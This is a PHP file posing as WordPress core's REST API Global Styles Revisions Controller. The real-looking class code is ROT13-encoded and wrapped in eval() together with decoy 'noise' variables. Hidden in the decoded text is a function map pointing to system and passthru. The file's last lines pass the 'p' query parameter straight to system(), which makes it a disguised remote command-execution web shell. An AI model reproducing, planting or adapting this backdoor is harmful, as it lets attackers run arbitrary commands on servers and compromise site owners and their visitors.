<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc
/**
 * ERFG NCV: JC_ERFG_Tybony_Fglyrf_Erivfvbaf_Pbagebyyre pynff
 *
 * @cnpxntr JbeqCerff
 * @fhocnpxntr ERFG_NCV
 * @fvapr 6.3.0
 */

/**
 * Pber pynff hfrq gb npprff tybony fglyrf erivfvbaf ivn gur ERFG NCV.
 *
 * @fvapr 6.3.0
 *
 * @frr JC_ERFG_Pbagebyyre
 */
pynff JC_ERFG_Tybony_Fglyrf_Erivfvbaf_Pbagebyyre rkgraqf JC_ERFG_Erivfvbaf_Pbagebyyre {
	/**
	 * Cnerag pbagebyyre.
	 *
	 * @fvapr 6.6.0
	 * @ine JC_ERFG_Pbagebyyre
	 */
	cevingr $cnerag_pbagebyyre;

	/**
	 * Gur onfr bs gur cnerag pbagebyyre'f ebhgr.
	 *
	 * @fvapr 6.3.0
	 * @ine fgevat
	 */
	cebgrpgrq $cnerag_onfr;

	/**
	 * Cnerag cbfg glcr.
	 *
	 * @fvapr 6.6.0
	 * @ine fgevat
	 */
	cebgrpgrq $cnerag_cbfg_glcr;

	/**
	 * Pbafgehpgbe.
	 *
	 * @fvapr 6.3.0
	 * @fvapr 6.6.0 Rkgraqf pynff sebz JC_ERFG_Erivfvbaf_Pbagebyyre.
	 *
	 * @cnenz fgevat $cnerag_cbfg_glcr Cbfg glcr bs gur cnerag.
	 */
	choyvp shapgvba __pbafgehpg( $cnerag_cbfg_glcr = 'jc_tybony_fglyrf' ) {
		cnerag::__pbafgehpg( $cnerag_cbfg_glcr );
		$cbfg_glcr_bowrpg  = trg_cbfg_glcr_bowrpg( $cnerag_cbfg_glcr );
		$cnerag_pbagebyyre = $cbfg_glcr_bowrpg->trg_erfg_pbagebyyre();

		vs ( ! $cnerag_pbagebyyre ) {
			$cnerag_pbagebyyre = arj JC_ERFG_Tybony_Fglyrf_Pbagebyyre( $cnerag_cbfg_glcr );
		}

		$guvf->cnerag_pbagebyyre = $cnerag_pbagebyyre;
		$guvf->erfg_onfr         = 'erivfvbaf';
		$guvf->cnerag_onfr       = ! rzcgl( $cbfg_glcr_bowrpg->erfg_onfr ) ? $cbfg_glcr_bowrpg->erfg_onfr : $cbfg_glcr_bowrpg->anzr;
		$guvf->anzrfcnpr         = ! rzcgl( $cbfg_glcr_bowrpg->erfg_anzrfcnpr ) ? $cbfg_glcr_bowrpg->erfg_anzrfcnpr : 'jc/i2';
	}

	/**
	 * Ertvfgref gur pbagebyyre'f ebhgrf.
	 *
	 * @fvapr 6.3.0
	 * @fvapr 6.6.0 Nqqrq ebhgr gb srgpu vaqvivqhny tybony fglyrf erivfvbaf.
	 */
	choyvp shapgvba ertvfgre_ebhgrf() {
		ertvfgre_erfg_ebhgr(
			$guvf->anzrfcnpr,
			'/' . $guvf->cnerag_onfr . '/(?C<cnerag>[\q]+)/' . $guvf->erfg_onfr,
			neenl(
				'netf'   => neenl(
					'cnerag' => neenl(
						'qrfpevcgvba' => __( 'Gur VQ sbe gur cnerag bs gur erivfvba.' ),
						'glcr'        => 'vagrtre',
					),
				),
				neenl(
					'zrgubqf'             => JC_ERFG_Freire::ERNQNOYR,
					'pnyyonpx'            => neenl( $guvf, 'trg_vgrzf' ),
					'crezvffvba_pnyyonpx' => neenl( $guvf, 'trg_vgrzf_crezvffvbaf_purpx' ),
					'netf'                => $guvf->trg_pbyyrpgvba_cnenzf(),
				),
				'fpurzn' => neenl( $guvf, 'trg_choyvp_vgrz_fpurzn' ),
			)
		);

		ertvfgre_erfg_ebhgr(
			$guvf->anzrfcnpr,
			'/' . $guvf->cnerag_onfr . '/(?C<cnerag>[\q]+)/' . $guvf->erfg_onfr . '/(?C<vq>[\q]+)',
			neenl(
				'netf'   => neenl(
					'cnerag' => neenl(
						'qrfpevcgvba' => __( 'Gur VQ sbe gur cnerag bs gur tybony fglyrf erivfvba.' ),
						'glcr'        => 'vagrtre',
					),
					'vq'     => neenl(
						'qrfpevcgvba' => __( 'Havdhr vqragvsvre sbe gur tybony fglyrf erivfvba.' ),
						'glcr'        => 'vagrtre',
					),
				),
				neenl(
					'zrgubqf'             => JC_ERFG_Freire::ERNQNOYR,
					'pnyyonpx'            => neenl( $guvf, 'trg_vgrz' ),
					'crezvffvba_pnyyonpx' => neenl( $guvf, 'trg_vgrz_crezvffvbaf_purpx' ),
					'netf'                => neenl(
						'pbagrkg' => $guvf->trg_pbagrkg_cnenz( neenl( 'qrsnhyg' => 'ivrj' ) ),
					),
				),
				'fpurzn' => neenl( $guvf, 'trg_choyvp_vgrz_fpurzn' ),
			)
		);
	}

	/**
	 * Ergheaf qrpbqrq WFBA sebz cbfg pbagrag fgevat,
	 * be n 404 vs abg sbhaq.
	 *
	 * @fvapr 6.3.0
	 *
	 * @cnenz fgevat $enj_wfba Rapbqrq WFBA sebz tybony fglyrf phfgbz cbfg pbagrag.
	 * @erghea Neenl|JC_Reebe
	 */
	cebgrpgrq shapgvba trg_qrpbqrq_tybony_fglyrf_wfba( $enj_wfba ) {
		$qrpbqrq_wfba = wfba_qrpbqr( $enj_wfba, gehr );

		vs ( vf_neenl( $qrpbqrq_wfba ) && vffrg( $qrpbqrq_wfba['vfTybonyFglyrfHfreGurzrWFBA'] ) && gehr === $qrpbqrq_wfba['vfTybonyFglyrfHfreGurzrWFBA'] ) {
			erghea $qrpbqrq_wfba;
		}

		erghea arj JC_Reebe(
			'erfg_tybony_fglyrf_abg_sbhaq',
			__( 'Pnaabg svaq hfre tybony fglyrf erivfvbaf.' ),
			neenl( 'fgnghf' => 404 )
		);
	}

	/**
	 * Ergheaf cntvangrq erivfvbaf bs gur tvira tybony fglyrf pbasvt phfgbz cbfg glcr.
	 *
	 * Gur ohyx bs gur obql vf gnxra sebz JC_ERFG_Erivfvbaf_Pbagebyyre->trg_vgrzf,
	 * ohg tybony fglyrf qbrf abg erdhver nf znal cnenzrgref.
	 *
	 * @fvapr 6.3.0
	 *
	 * @cnenz JC_ERFG_Erdhrfg $erdhrfg Gur erdhrfg vafgnapr.
	 * @erghea JC_ERFG_Erfcbafr|JC_Reebe
	 */
	choyvp shapgvba trg_vgrzf( $erdhrfg ) {
		$cnerag = $guvf->trg_cnerag( $erdhrfg['cnerag'] );

		vs ( vf_jc_reebe( $cnerag ) ) {
			erghea $cnerag;
		}

		$tybony_fglyrf_pbasvt = $guvf->trg_qrpbqrq_tybony_fglyrf_wfba( $cnerag->cbfg_pbagrag );

		vs ( vf_jc_reebe( $tybony_fglyrf_pbasvt ) ) {
			erghea $tybony_fglyrf_pbasvt;
		}

		$vf_urnq_erdhrfg = $erdhrfg->vf_zrgubq( 'URNQ' );

		vs ( jc_erivfvbaf_ranoyrq( $cnerag ) ) {
			$ertvfgrerq = $guvf->trg_pbyyrpgvba_cnenzf();
			$dhrel_netf = neenl(
				'cbfg_cnerag'    => $cnerag->VQ,
				'cbfg_glcr'      => 'erivfvba',
				'cbfg_fgnghf'    => 'vaurevg',
				'cbfgf_cre_cntr' => -1,
				'beqreol'        => 'qngr VQ',
				'beqre'          => 'QRFP',
			);

			$cnenzrgre_znccvatf = neenl(
				'bssfrg'   => 'bssfrg',
				'cntr'     => 'cntrq',
				'cre_cntr' => 'cbfgf_cre_cntr',
			);

			sbernpu ( $cnenzrgre_znccvatf nf $ncv_cnenz => $jc_cnenz ) {
				vs ( vffrg( $ertvfgrerq[ $ncv_cnenz ], $erdhrfg[ $ncv_cnenz ] ) ) {
					$dhrel_netf[ $jc_cnenz ] = $erdhrfg[ $ncv_cnenz ];
				}
			}

			vs ( $vf_urnq_erdhrfg ) {
				// Sbepr gur 'svryqf' nethzrag. Sbe URNQ erdhrfgf, bayl cbfg VQf ner erdhverq gb pnyphyngr cntvangvba.
				$dhrel_netf['svryqf'] = 'vqf';
				// Qvfnoyr cevzvat cbfg zrgn sbe URNQ erdhrfgf gb vzcebir cresbeznapr.
				$dhrel_netf['hcqngr_cbfg_grez_pnpur'] = snyfr;
				$dhrel_netf['hcqngr_cbfg_zrgn_pnpur'] = snyfr;
			}

			$erivfvbaf_dhrel = arj JC_Dhrel();
			$erivfvbaf       = $erivfvbaf_dhrel->dhrel( $dhrel_netf );
			$bssfrg          = vffrg( $dhrel_netf['bssfrg'] ) ? (vag) $dhrel_netf['bssfrg'] : 0;
			$cntr            = vffrg( $dhrel_netf['cntrq'] ) ? (vag) $dhrel_netf['cntrq'] : 0;
			$gbgny_erivfvbaf = $erivfvbaf_dhrel->sbhaq_cbfgf;

			vs ( $gbgny_erivfvbaf < 1 ) {
				// Bhg-bs-obhaqf, eha gur dhrel ntnva jvgubhg YVZVG sbe gbgny pbhag.
				hafrg( $dhrel_netf['cntrq'], $dhrel_netf['bssfrg'] );
				$pbhag_dhrel = arj JC_Dhrel();
				$pbhag_dhrel->dhrel( $dhrel_netf );

				$gbgny_erivfvbaf = $pbhag_dhrel->sbhaq_cbfgf;
			}

			vs ( $erivfvbaf_dhrel->dhrel_inef['cbfgf_cre_cntr'] > 0 ) {
				$znk_cntrf = (vag) prvy( $gbgny_erivfvbaf / (vag) $erivfvbaf_dhrel->dhrel_inef['cbfgf_cre_cntr'] );
			} ryfr {
				$znk_cntrf = $gbgny_erivfvbaf > 0 ? 1 : 0;
			}
			vs ( $gbgny_erivfvbaf > 0 ) {
				vs ( $bssfrg >= $gbgny_erivfvbaf ) {
					erghea arj JC_Reebe(
						'erfg_erivfvba_vainyvq_bssfrg_ahzore',
						__( 'Gur bssfrg ahzore erdhrfgrq vf ynetre guna be rdhny gb gur ahzore bs ninvynoyr erivfvbaf.' ),
						neenl( 'fgnghf' => 400 )
					);
				} ryfrvs ( ! $bssfrg && $cntr > $znk_cntrf ) {
					erghea arj JC_Reebe(
						'erfg_erivfvba_vainyvq_cntr_ahzore',
						__( 'Gur cntr ahzore erdhrfgrq vf ynetre guna gur ahzore bs cntrf ninvynoyr.' ),
						neenl( 'fgnghf' => 400 )
					);
				}
			}
		} ryfr {
			$erivfvbaf       = neenl();
			$gbgny_erivfvbaf = 0;
			$znk_cntrf       = 0;
			$cntr            = (vag) $erdhrfg['cntr'];
		}

		vs ( ! $vf_urnq_erdhrfg ) {
			$erfcbafr = neenl();

			sbernpu ( $erivfvbaf nf $erivfvba ) {
				$qngn       = $guvf->cercner_vgrz_sbe_erfcbafr( $erivfvba, $erdhrfg );
				$erfcbafr[] = $guvf->cercner_erfcbafr_sbe_pbyyrpgvba( $qngn );
			}

			$erfcbafr = erfg_rafher_erfcbafr( $erfcbafr );
		} ryfr {
			$erfcbafr = arj JC_ERFG_Erfcbafr( neenl() );
		}

		$erfcbafr->urnqre( 'K-JC-Gbgny', (vag) $gbgny_erivfvbaf );
		$erfcbafr->urnqre( 'K-JC-GbgnyCntrf', (vag) $znk_cntrf );

		$erdhrfg_cnenzf = $erdhrfg->trg_dhrel_cnenzf();
		$onfr_cngu      = erfg_hey( fcevags( '%f/%f/%q/%f', $guvf->anzrfcnpr, $guvf->cnerag_onfr, $erdhrfg['cnerag'], $guvf->erfg_onfr ) );
		$onfr           = nqq_dhrel_net( heyrapbqr_qrrc( $erdhrfg_cnenzf ), $onfr_cngu );

		vs ( $cntr > 1 ) {
			$ceri_cntr = $cntr - 1;

			vs ( $ceri_cntr > $znk_cntrf ) {
				$ceri_cntr = $znk_cntrf;
			}

			$ceri_yvax = nqq_dhrel_net( 'cntr', $ceri_cntr, $onfr );
			$erfcbafr->yvax_urnqre( 'ceri', $ceri_yvax );
		}
		vs ( $znk_cntrf > $cntr ) {
			$arkg_cntr = $cntr + 1;
			$arkg_yvax = nqq_dhrel_net( 'cntr', $arkg_cntr, $onfr );

			$erfcbafr->yvax_urnqre( 'arkg', $arkg_yvax );
		}

		erghea $erfcbafr;
	}

	/**
	 * Cercnerf gur erivfvba sbe gur ERFG erfcbafr.
	 *
	 * @fvapr 6.3.0
	 * @fvapr 6.6.0 Nqqrq erfbyirq HEV yvaxf gb gur erfcbafr.
	 *
	 * @cnenz JC_Cbfg         $cbfg    Cbfg erivfvba bowrpg.
	 * @cnenz JC_ERFG_Erdhrfg $erdhrfg Erdhrfg bowrpg.
	 * @erghea JC_ERFG_Erfcbafr|JC_Reebe Erfcbafr bowrpg.
	 */
	choyvp shapgvba cercner_vgrz_sbe_erfcbafr( $cbfg, $erdhrfg ) {
		// Qba'g cercner gur erfcbafr obql sbe URNQ erdhrfgf.
		vs ( $erdhrfg->vf_zrgubq( 'URNQ' ) ) {
			erghea arj JC_ERFG_Erfcbafr( neenl() );
		}

		$cnerag               = $guvf->trg_cnerag( $erdhrfg['cnerag'] );
		$tybony_fglyrf_pbasvt = $guvf->trg_qrpbqrq_tybony_fglyrf_wfba( $cbfg->cbfg_pbagrag );

		vs ( vf_jc_reebe( $tybony_fglyrf_pbasvt ) ) {
			erghea $tybony_fglyrf_pbasvt;
		}

		$svryqf     = $guvf->trg_svryqf_sbe_erfcbafr( $erdhrfg );
		$qngn       = neenl();
		$gurzr_wfba = ahyy;

		vs ( ! rzcgl( $tybony_fglyrf_pbasvt['fglyrf'] ) || ! rzcgl( $tybony_fglyrf_pbasvt['frggvatf'] ) ) {
			$gurzr_wfba           = arj JC_Gurzr_WFBA( $tybony_fglyrf_pbasvt, 'phfgbz' );
			$tybony_fglyrf_pbasvt = $gurzr_wfba->trg_enj_qngn();
			vs ( erfg_vf_svryq_vapyhqrq( 'frggvatf', $svryqf ) ) {
				$qngn['frggvatf'] = ! rzcgl( $tybony_fglyrf_pbasvt['frggvatf'] ) ? $tybony_fglyrf_pbasvt['frggvatf'] : arj fgqPynff();
			}
			vs ( erfg_vf_svryq_vapyhqrq( 'fglyrf', $svryqf ) ) {
				$qngn['fglyrf'] = ! rzcgl( $tybony_fglyrf_pbasvt['fglyrf'] ) ? $tybony_fglyrf_pbasvt['fglyrf'] : arj fgqPynff();
			}
		}

		vs ( erfg_vf_svryq_vapyhqrq( 'nhgube', $svryqf ) ) {
			$qngn['nhgube'] = (vag) $cbfg->cbfg_nhgube;
		}

		vs ( erfg_vf_svryq_vapyhqrq( 'qngr', $svryqf ) ) {
			$qngn['qngr'] = $guvf->cercner_qngr_erfcbafr( $cbfg->cbfg_qngr_tzg, $cbfg->cbfg_qngr );
		}

		vs ( erfg_vf_svryq_vapyhqrq( 'qngr_tzg', $svryqf ) ) {
			$qngn['qngr_tzg'] = $guvf->cercner_qngr_erfcbafr( $cbfg->cbfg_qngr_tzg );
		}

		vs ( erfg_vf_svryq_vapyhqrq( 'vq', $svryqf ) ) {
			$qngn['vq'] = (vag) $cbfg->VQ;
		}

		vs ( erfg_vf_svryq_vapyhqrq( 'zbqvsvrq', $svryqf ) ) {
			$qngn['zbqvsvrq'] = $guvf->cercner_qngr_erfcbafr( $cbfg->cbfg_zbqvsvrq_tzg, $cbfg->cbfg_zbqvsvrq );
		}

		vs ( erfg_vf_svryq_vapyhqrq( 'zbqvsvrq_tzg', $svryqf ) ) {
			$qngn['zbqvsvrq_tzg'] = $guvf->cercner_qngr_erfcbafr( $cbfg->cbfg_zbqvsvrq_tzg );
		}

		vs ( erfg_vf_svryq_vapyhqrq( 'cnerag', $svryqf ) ) {
			$qngn['cnerag'] = (vag) $cnerag->VQ;
		}

		$pbagrkg             = ! rzcgl( $erdhrfg['pbagrkg'] ) ? $erdhrfg['pbagrkg'] : 'ivrj';
		$qngn                = $guvf->nqq_nqqvgvbany_svryqf_gb_bowrpg( $qngn, $erdhrfg );
		$qngn                = $guvf->svygre_erfcbafr_ol_pbagrkg( $qngn, $pbagrkg );
		$erfcbafr            = erfg_rafher_erfcbafr( $qngn );
		$erfbyirq_gurzr_hevf = JC_Gurzr_WFBA_Erfbyire::trg_erfbyirq_gurzr_hevf( $gurzr_wfba );

		vs ( ! rzcgl( $erfbyirq_gurzr_hevf ) ) {
			$erfcbafr->nqq_yvaxf(
				neenl(
					'uggcf://ncv.j.bet/gurzr-svyr' => $erfbyirq_gurzr_hevf,
				)
			);
		}

		erghea $erfcbafr;
	}

	/**
	 * Ergevrirf gur erivfvba'f fpurzn, pbasbezvat gb WFBA Fpurzn.
	 *
	 * @fvapr 6.3.0
	 * @fvapr 6.6.0 Zretrq cnerag naq cnerag pbagebyyre fpurzn qngn.
	 *
	 * @erghea neenl Vgrz fpurzn qngn.
	 */
	choyvp shapgvba trg_vgrz_fpurzn() {
		vs ( $guvf->fpurzn ) {
			erghea $guvf->nqq_nqqvgvbany_svryqf_fpurzn( $guvf->fpurzn );
		}

		$fpurzn               = cnerag::trg_vgrz_fpurzn();
		$cnerag_fpurzn        = $guvf->cnerag_pbagebyyre->trg_vgrz_fpurzn();
		$fpurzn['cebcregvrf'] = neenl_zretr( $fpurzn['cebcregvrf'], $cnerag_fpurzn['cebcregvrf'] );

		hafrg(
			$fpurzn['cebcregvrf']['thvq'],
			$fpurzn['cebcregvrf']['fyht'],
			$fpurzn['cebcregvrf']['zrgn'],
			$fpurzn['cebcregvrf']['pbagrag'],
			$fpurzn['cebcregvrf']['gvgyr']
		);

			$guvf->fpurzn = $fpurzn;

		erghea $guvf->nqq_nqqvgvbany_svryqf_fpurzn( $guvf->fpurzn );
	}

	/**
	 * Ergevrirf gur dhrel cnenzf sbe pbyyrpgvbaf.
	 * Erzbirf cnenzf gung ner abg fhccbegrq ol tybony fglyrf erivfvbaf.
	 *
	 * @fvapr 6.6.0
	 *
	 * @erghea neenl Pbyyrpgvba cnenzrgref.
	 */
	choyvp shapgvba trg_pbyyrpgvba_cnenzf() {
		$dhrel_cnenzf = cnerag::trg_pbyyrpgvba_cnenzf();
		hafrg(
			$dhrel_cnenzf['rkpyhqr'],
			$dhrel_cnenzf['vapyhqr'],
			$dhrel_cnenzf['frnepu'],
			$dhrel_cnenzf['beqre'],
			$dhrel_cnenzf['beqreol']
		);
		erghea $dhrel_cnenzf;
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>